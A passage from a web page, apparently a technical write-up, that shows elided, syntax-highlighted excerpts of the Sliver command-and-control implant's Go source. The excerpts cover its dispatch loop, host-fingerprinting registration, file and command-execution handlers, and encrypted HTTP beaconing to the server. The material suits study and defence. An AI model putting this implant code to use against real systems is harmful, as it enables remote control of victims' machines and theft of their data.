<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> pivotHandlers[envelope.Type]; ok &#123; </span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> rportfwdHandlers[envelope.Type]; ok &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> sysHandlers[envelope.Type]; ok &#123;</span></span>
<span class="line"><span style="color:#8B949E">			// Beware, here be dragons.</span></span>
<span class="line"><span style="color:#8B949E">			// This is required for the specific case of token impersonation:</span></span>
<span class="line"><span style="color:#8B949E">			// Since goroutines don't always execute in the same thread, but ImpersonateLoggedOnUser</span></span>
<span class="line"><span style="color:#8B949E">			// only applies the token to the calling thread, we need to call it before every task.</span></span>
<span class="line"><span style="color:#8B949E">			// It's fucking gross to do that here, but I could not come with a better solution.</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#8B949E">			// &#123;&#123;if eq .Config.GOOS "windows" &#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#E6EDF3"> handlers.</span><span style="color:#D2A8FF">WrapperHandler</span><span style="color:#E6EDF3">(handler, envelope.Data, </span><span style="color:#FF7B72">func</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">err</span><span style="color:#FF7B72"> error</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">				connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
<span class="line"><span style="color:#E6EDF3">					ID:   envelope.ID,</span></span>
<span class="line"><span style="color:#E6EDF3">					Data: data,</span></span>
<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">			&#125;)</span></span>
<span class="line"><span style="color:#8B949E">			// &#123;&#123;else&#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope.Data, </span><span style="color:#FF7B72">func</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">err</span><span style="color:#FF7B72"> error</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">				connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
<span class="line"><span style="color:#E6EDF3">					ID:   envelope.ID,</span></span>
<span class="line"><span style="color:#E6EDF3">					Data: data,</span></span>
<span class="line"><span style="color:#E6EDF3">				&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">			&#125;)</span></span>
<span class="line"><span style="color:#8B949E">			// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> handler, ok </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> tunHandlers[envelope.Type]; ok &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			go</span><span style="color:#D2A8FF"> handler</span><span style="color:#E6EDF3">(envelope, connection)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#FF7B72"> if</span><span style="color:#E6EDF3"> envelope.Type </span><span style="color:#FF7B72">==</span><span style="color:#E6EDF3"> sliverpb.MsgCloseSession &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			return</span><span style="color:#79C0FF"> nil</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125; </span><span style="color:#FF7B72">else</span><span style="color:#E6EDF3"> &#123; </span><span style="color:#8B949E">//empty message recieved, send back empty acknowledgement</span></span>
<span class="line"><span style="color:#E6EDF3">			connection.Send </span><span style="color:#FF7B72">&#x3C;-</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">&#123;</span></span>
<span class="line"><span style="color:#E6EDF3">				ID:                 envelope.ID,</span></span>
<span class="line"><span style="color:#E6EDF3">				Data:               </span><span style="color:#79C0FF">nil</span><span style="color:#E6EDF3">,</span></span>
<span class="line"><span style="color:#E6EDF3">				UnknownMessageType: </span><span style="color:#79C0FF">true</span><span style="color:#E6EDF3">,</span></span>
<span class="line"><span style="color:#E6EDF3">			&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span>
<span class="line"></span></code></pre>`);var E=a(u,4);n(E,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> registerSliver</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Register</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">	hostname, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Hostname</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	currentUser, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> user.</span><span style="color:#D2A8FF">Current</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	filename, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Executable</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#8B949E">	// Retrieve UUID</span></span>
<span class="line"><span style="color:#E6EDF3">	uuid </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> hostuuid.</span><span style="color:#D2A8FF">GetUUID</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Register</span><span style="color:#E6EDF3">&#123;</span></span>
<span class="line"><span style="color:#E6EDF3">		Name:              consts.SliverName,</span></span>
<span class="line"><span style="color:#E6EDF3">		Hostname:          hostname,</span></span>
<span class="line"><span style="color:#E6EDF3">		Uuid:              uuid,</span></span>
<span class="line"><span style="color:#E6EDF3">		Username:          currentUser.Username,</span></span>
<span class="line"><span style="color:#E6EDF3">		Uid:               currentUser.Uid,</span></span>
<span class="line"><span style="color:#E6EDF3">		Gid:               currentUser.Gid,</span></span>
<span class="line"><span style="color:#E6EDF3">		Os:                runtime.GOOS,</span></span>
<span class="line"><span style="color:#E6EDF3">		Version:           version.</span><span style="color:#D2A8FF">GetVersion</span><span style="color:#E6EDF3">(),</span></span>
<span class="line"><span style="color:#E6EDF3">		Arch:              runtime.GOARCH,</span></span>
<span class="line"><span style="color:#E6EDF3">		Pid:               </span><span style="color:#FF7B72">int32</span><span style="color:#E6EDF3">(os.</span><span style="color:#D2A8FF">Getpid</span><span style="color:#E6EDF3">()),</span></span>
<span class="line"><span style="color:#E6EDF3">		Filename:          filename,</span></span>
<span class="line"><span style="color:#E6EDF3">		ReconnectInterval: </span><span style="color:#FF7B72">int64</span><span style="color:#E6EDF3">(transports.</span><span style="color:#D2A8FF">GetReconnectInterval</span><span style="color:#E6EDF3">()),</span></span>
<span class="line"><span style="color:#E6EDF3">		ConfigID:          </span><span style="color:#A5D6FF">"&#123;&#123; .Config.ID &#125;&#125;"</span><span style="color:#E6EDF3">,</span></span>
<span class="line"><span style="color:#E6EDF3">		PeerID:            pivots.MyPeerID,</span></span>
<span class="line"><span style="color:#E6EDF3">		Locale:            locale.</span><span style="color:#D2A8FF">GetLocale</span><span style="color:#E6EDF3">(),</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var f=a(E,4);n(f,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/handlers/handlers_generic.go</span></span>
<span class="line"><span style="color:#E6EDF3">genericHandlers </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> map</span><span style="color:#E6EDF3">[</span><span style="color:#FF7B72">uint32</span><span style="color:#E6EDF3">]</span><span style="color:#FFA657">RPCHandler</span><span style="color:#E6EDF3">&#123;</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgPing:           pingHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgLsReq:          dirListHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgDownloadReq:    downloadHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgUploadReq:      uploadHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgCdReq:          cdHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgPwdReq:         pwdHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgRmReq:          rmHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgMkdirReq:       mkdirHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgMvReq:          mvHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgCpReq:          cpHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgExecuteReq:     executeHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgSetEnvReq:      setEnvHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgEnvReq:         getEnvHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgUnsetEnvReq:    unsetEnvHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgReconfigureReq: reconfigureHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgChtimesReq:     chtimesHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgGrepReq:        grepHandler,</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8B949E">	// Wasm Extensions - Note that execution can be done via a tunnel handler</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">	sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var F=a(f,4);n(F,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/handlers/handlers.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> executeHandler</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">data</span><span style="color:#E6EDF3"> []</span><span style="color:#FF7B72">byte</span><span style="color:#E6EDF3">, </span><span style="color:#FFA657">resp</span><span style="color:#FFA657"> RPCResponse</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#FF7B72">	var</span><span style="color:#E6EDF3"> (</span></span>
<span class="line"><span style="color:#E6EDF3">		err       </span><span style="color:#FF7B72">error</span></span>
<span class="line"><span style="color:#E6EDF3">		stdErr    </span><span style="color:#FFA657">io</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
<span class="line"><span style="color:#E6EDF3">		stdOut    </span><span style="color:#FFA657">io</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
<span class="line"><span style="color:#E6EDF3">		errWriter </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">bufio</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
<span class="line"><span style="color:#E6EDF3">		outWriter </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">bufio</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Writer</span></span>
<span class="line"><span style="color:#E6EDF3">	)</span></span>
<span class="line"><span style="color:#E6EDF3">	execReq </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">ExecuteReq</span><span style="color:#E6EDF3">&#123;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Unmarshal</span><span style="color:#E6EDF3">(data, execReq)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	execResp </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> &#x26;</span><span style="color:#FFA657">sliverpb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Execute</span><span style="color:#E6EDF3">&#123;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	exePath, err </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> expandPath</span><span style="color:#E6EDF3">(execReq.Path)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	cmd </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> exec.</span><span style="color:#D2A8FF">Command</span><span style="color:#E6EDF3">(exePath, execReq.Args</span><span style="color:#FF7B72">...</span><span style="color:#E6EDF3">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> execReq.Output &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">		stdOutBuff </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> new</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">bytes</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Buffer</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">		stdErrBuff </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> new</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">bytes</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Buffer</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">		stdErr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErrBuff</span></span>
<span class="line"><span style="color:#E6EDF3">		stdOut </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOutBuff</span></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> execReq.Stderr </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			stdErrFile, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Create</span><span style="color:#E6EDF3">(execReq.Stderr)</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> stdErrFile.</span><span style="color:#D2A8FF">Close</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">			errWriter </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> bufio.</span><span style="color:#D2A8FF">NewWriter</span><span style="color:#E6EDF3">(stdErrFile)</span></span>
<span class="line"><span style="color:#E6EDF3">			stdErr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">MultiWriter</span><span style="color:#E6EDF3">(errWriter, stdErrBuff)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> execReq.Stdout </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			stdOutFile, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> os.</span><span style="color:#D2A8FF">Create</span><span style="color:#E6EDF3">(execReq.Stdout)</span></span>
<span class="line"><span style="color:#FF7B72">			...</span></span>
<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> stdOutFile.</span><span style="color:#D2A8FF">Close</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">			outWriter </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> bufio.</span><span style="color:#D2A8FF">NewWriter</span><span style="color:#E6EDF3">(stdOutFile)</span></span>
<span class="line"><span style="color:#E6EDF3">			stdOut </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> io.</span><span style="color:#D2A8FF">MultiWriter</span><span style="color:#E6EDF3">(outWriter, stdOutBuff)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		cmd.Stdout </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOut</span></span>
<span class="line"><span style="color:#E6EDF3">		cmd.Stderr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErr</span></span>
<span class="line"><span style="color:#E6EDF3">		err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> cmd.</span><span style="color:#D2A8FF">Run</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">		...</span></span>
<span class="line"><span style="color:#E6EDF3">		execResp.Stderr </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdErrBuff.</span><span style="color:#D2A8FF">Bytes</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">		execResp.Stdout </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> stdOutBuff.</span><span style="color:#D2A8FF">Bytes</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> cmd.Process </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			execResp.Pid </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> uint32</span><span style="color:#E6EDF3">(cmd.Process.Pid)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125; </span><span style="color:#FF7B72">else</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">		err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> cmd.</span><span style="color:#D2A8FF">Start</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">		...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">		go</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			cmd.</span><span style="color:#D2A8FF">Wait</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;()</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">		if</span><span style="color:#E6EDF3"> cmd.Process </span><span style="color:#FF7B72">!=</span><span style="color:#79C0FF"> nil</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">			execResp.Pid </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> uint32</span><span style="color:#E6EDF3">(cmd.Process.Pid)</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(execResp)</span></span>
<span class="line"><span style="color:#D2A8FF">	resp</span><span style="color:#E6EDF3">(data, err)</span></span>
<span class="line"><span style="color:#E6EDF3">&#125;</span></span></code></pre>`);var D=a(F,4);n(D,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/transports/session.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#D2A8FF"> httpConnect</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">uri</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">url</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">URL</span><span style="color:#E6EDF3">) (</span><span style="color:#FF7B72">*</span><span style="color:#FFA657">Connection</span><span style="color:#E6EDF3">, </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3">) &#123;</span></span>
<span class="line"><span style="color:#E6EDF3">	send </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> make</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">	recv </span><span style="color:#FF7B72">:=</span><span style="color:#D2A8FF"> make</span><span style="color:#E6EDF3">(</span><span style="color:#FF7B72">chan</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	connection.Start </span><span style="color:#FF7B72">=</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		...</span></span>
<span class="line"><span style="color:#FF7B72">		go</span><span style="color:#FF7B72"> func</span><span style="color:#E6EDF3">() &#123;</span></span>
<span class="line"><span style="color:#FF7B72">			defer</span><span style="color:#E6EDF3"> connection.</span><span style="color:#D2A8FF">Cleanup</span><span style="color:#E6EDF3">()</span></span>
<span class="line"><span style="color:#FF7B72">			for</span><span style="color:#E6EDF3"> envelope </span><span style="color:#FF7B72">:=</span><span style="color:#FF7B72"> range</span><span style="color:#E6EDF3"> send &#123;</span></span>
<span class="line"><span style="color:#8B949E">				// &#123;&#123;if .Config.Debug&#125;&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">				log.</span><span style="color:#D2A8FF">Printf</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"[http] send envelope ..."</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#8B949E">				// &#123;&#123;end&#125;&#125;</span></span>
<span class="line"><span style="color:#FF7B72">				go</span><span style="color:#E6EDF3"> client.</span><span style="color:#D2A8FF">WriteEnvelope</span><span style="color:#E6EDF3">(envelope)</span></span>
<span class="line"><span style="color:#E6EDF3">			&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">		&#125;()</span></span>
<span class="line"><span style="color:#FF7B72">		...</span></span></code></pre>`);var i=a(D,4);n(i,()=>`<pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span style="color:#8B949E">// implant/sliver/transports/httpclient/httpclient.go</span></span>
<span class="line"></span>
<span class="line"><span style="color:#8B949E">// WriteEnvelope - Perform an HTTP POST request</span></span>
<span class="line"><span style="color:#FF7B72">func</span><span style="color:#E6EDF3"> (</span><span style="color:#FFA657">s </span><span style="color:#FF7B72">*</span><span style="color:#FFA657">SliverHTTPClient</span><span style="color:#E6EDF3">) </span><span style="color:#D2A8FF">WriteEnvelope</span><span style="color:#E6EDF3">(</span><span style="color:#FFA657">envelope</span><span style="color:#FF7B72"> *</span><span style="color:#FFA657">pb</span><span style="color:#E6EDF3">.</span><span style="color:#FFA657">Envelope</span><span style="color:#E6EDF3">) </span><span style="color:#FF7B72">error</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> s.Closed &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> ErrClosed</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	data, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> proto.</span><span style="color:#D2A8FF">Marshal</span><span style="color:#E6EDF3">(envelope)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> s.SessionID </span><span style="color:#FF7B72">==</span><span style="color:#A5D6FF"> ""</span><span style="color:#E6EDF3"> &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> errors.</span><span style="color:#D2A8FF">New</span><span style="color:#E6EDF3">(</span><span style="color:#A5D6FF">"no session"</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#E6EDF3">	reqData, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.SessionCtx.</span><span style="color:#D2A8FF">Encrypt</span><span style="color:#E6EDF3">(data)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	uri </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">parseSegments</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">1</span><span style="color:#E6EDF3">)</span></span>
<span class="line"><span style="color:#E6EDF3">	nonce, encoder </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoders.</span><span style="color:#D2A8FF">RandomEncoder</span><span style="color:#E6EDF3">(</span><span style="color:#D2A8FF">len</span><span style="color:#E6EDF3">(reqData))</span></span>
<span class="line"><span style="color:#E6EDF3">	s.</span><span style="color:#D2A8FF">NonceQueryArgument</span><span style="color:#E6EDF3">(uri, nonce)</span></span>
<span class="line"><span style="color:#E6EDF3">	encodedValue, _ </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> encoder.</span><span style="color:#D2A8FF">Encode</span><span style="color:#E6EDF3">(reqData)</span></span>
<span class="line"><span style="color:#E6EDF3">	reader </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> bytes.</span><span style="color:#D2A8FF">NewReader</span><span style="color:#E6EDF3">(encodedValue)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"></span>
<span class="line"><span style="color:#E6EDF3">	req </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.</span><span style="color:#D2A8FF">newHTTPRequest</span><span style="color:#E6EDF3">(http.MethodPost, uri, reader)</span></span>
<span class="line"><span style="color:#E6EDF3">	resp, err </span><span style="color:#FF7B72">:=</span><span style="color:#E6EDF3"> s.driver.</span><span style="color:#D2A8FF">Do</span><span style="color:#E6EDF3">(req)</span></span>
<span class="line"><span style="color:#FF7B72">	...</span></span>
<span class="line"><span style="color:#E6EDF3">	</span></span>
<span class="line"><span style="color:#FF7B72">	if</span><span style="color:#E6EDF3"> resp.StatusCode </span><span style="color:#FF7B72">!=</span><span style="color:#E6EDF3"> http.StatusAccepted &#123;</span></span>
<span class="line"><span style="color:#FF7B72">		...</span></span>
<span class="line"><span style="color:#FF7B72">		return</span><span style="color:#E6EDF3"> ErrStatusCodeUnexpected</span></span>
<span class="line"><span style="color:#E6EDF3">	&#125;</span></span>
<span class="line"><span style="color:#FF7B72">	return</span><span style="color:#79C0FF"> nil</span></span>
